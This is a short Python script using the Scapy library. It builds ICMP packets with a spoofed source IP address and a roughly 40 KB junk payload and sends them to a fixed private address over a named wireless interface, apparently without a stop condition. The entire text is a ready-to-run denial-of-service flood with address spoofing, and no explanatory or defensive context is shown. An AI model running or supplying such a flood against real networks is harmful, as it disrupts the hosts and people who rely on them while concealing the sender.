from scapy.all import *

packet = IP(src="10.0.0.3", dst="192.168.13.1")/ICMP()/("oops" * 10000)
send(packet, count=-1, iface="wlp3s0")